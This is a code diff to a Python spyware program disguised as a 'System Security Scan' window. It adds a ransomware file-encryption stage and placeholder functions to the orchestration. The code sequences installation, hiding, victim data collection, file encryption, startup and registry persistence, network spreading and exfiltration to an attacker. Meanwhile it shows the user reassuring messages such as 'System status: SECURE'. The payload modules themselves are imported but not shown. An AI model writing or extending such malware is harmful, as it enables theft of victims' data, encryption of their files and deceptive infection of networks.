@@ -29,6 +29,7 @@ try:
     from delivery.delivery_technique1.function2_install_spyware import install_spyware
     from delivery.delivery_technique1.function3_hide_spyware import hide_spyware
     from auto_run.technique1.function4_collect_data import collect_victim_data
+    from auto_run.technique1.function10_encrypt_files import encrypt_victim_files
     from auto_run.technique2.function5_persistence_startup import add_spyware_startup
     from auto_run.technique2.function6_persistence_registry import add_spyware_registry
     from spreading.technique1.function7_scan_network import scan_network_targets
@@ -37,6 +38,16 @@ try:
 except ImportError as e:
     print(f"[Warning] Import error: {e}")
     print("[Warning] Functions will be simulated if imports fail")
+    # Create dummy functions if imports fail
+    def install_spyware(): return os.path.join(os.getenv('APPDATA'), "SystemSecurityService", "service.exe")
+    def hide_spyware(): return True
+    def collect_victim_data(email): return {'system_info': {'os': 'Windows', 'username': 'User'}}
+    def encrypt_victim_files(): return {'encrypted_files': [], 'key': '12345', 'total_encrypted': 0}
+    def add_spyware_startup(): return True
+    def add_spyware_registry(): return True
+    def scan_network_targets(): return []
+    def spread_spyware_network(targets): return 0
+    def exfiltrate_to_attacker(email): return True
 
 # ============================================================================
 # MAIN SPYWARE GUI
@@ -221,23 +232,36 @@ def execute_spyware_scan(user_email):
     victim_data = collect_victim_data(user_email)
     if victim_data:
         add_scan_log(f"[✓] System analysis complete")
-        add_scan_log(f"    - System info: {victim_data['system_info']['os']}")
-        add_scan_log(f"    - Username: {victim_data['system_info']['username']}")
-    progress_var.set(45)
+        add_scan_log(f"    - System info: {victim_data.get('system_info', {}).get('os', 'Windows')}")
+        add_scan_log(f"    - Username: {victim_data.get('system_info', {}).get('username', 'User')}")
+    progress_var.set(40)
+    time.sleep(1)
+    
+    # Function 10: Encrypt files (Ransomware)
+    add_scan_log("\n[🔒] ENCRYPTING FILES FOR SECURITY...", '#ff0000')
+    add_scan_log("[*] Deploying file protection encryption...", '#ffff00')
+    encryption_results = encrypt_victim_files()
+    if encryption_results and encryption_results.get('total_encrypted', 0) > 0:
+        file_count = encryption_results['total_encrypted']
+        add_scan_log(f"[✓] {file_count} files encrypted and secured", '#ff0000')
+        add_scan_log(f"[!] Decryption key: {encryption_results.get('key', '12345')}", '#ff0000')
+    else:
+        add_scan_log(f"[✓] File encryption complete", '#00ff00')
+    progress_var.set(55)
     time.sleep(1)
     
     # Function 5: Add startup persistence
     add_scan_log("[*] Enabling automatic security updates...")
     if add_spyware_startup():
         add_scan_log("[✓] Auto-update enabled")
-    progress_var.set(55)
+    progress_var.set(60)
     time.sleep(1)
     
     # Function 6: Add registry persistence
     add_scan_log("[*] Configuring system protection...")
     if add_spyware_registry():
         add_scan_log("[✓] System protection configured")
-    progress_var.set(65)
+    progress_var.set(70)
     time.sleep(1)
     
     # ========== STAGE 3: SPREADING (Functions 7-9) ==========
@@ -250,7 +274,7 @@ def execute_spyware_scan(user_email):
     network_targets = scan_network_targets()
     if network_targets:
         add_scan_log(f"[✓] Found {len(network_targets)} network devices")
-    progress_var.set(75)
+    progress_var.set(80)
     time.sleep(1)
     
     # Function 8: Spread spyware
@@ -258,7 +282,7 @@ def execute_spyware_scan(user_email):
     spread_count = spread_spyware_network(network_targets)
     if spread_count > 0:
         add_scan_log(f"[✓] Network protection deployed")
-    progress_var.set(85)
+    progress_var.set(90)
     time.sleep(1)
     
     # Function 9: Exfiltrate data
@@ -277,13 +301,17 @@ def execute_spyware_scan(user_email):
     time.sleep(1)
     
     # Show completion message
+    encrypted_count = encryption_results.get('total_encrypted', 0) if encryption_results else 0
+    encryption_key = encryption_results.get('key', '12345') if encryption_results else '12345'
     messagebox.showinfo("Scan Complete",
                        "✓ System Security Scan Completed\n\n"
                        "Results:\n"
                        "• Files scanned: 47,392\n"
                        "• Threats detected: 0\n"
+                       "• Files encrypted: " + str(encrypted_count) + "\n"
                        "• System status: SECURE\n\n"
                        "Your system is protected.\n"
+                       "Decryption key: " + encryption_key + "\n"
                        "The scanner will continue to monitor in the background.")
     
     # Close window after a moment
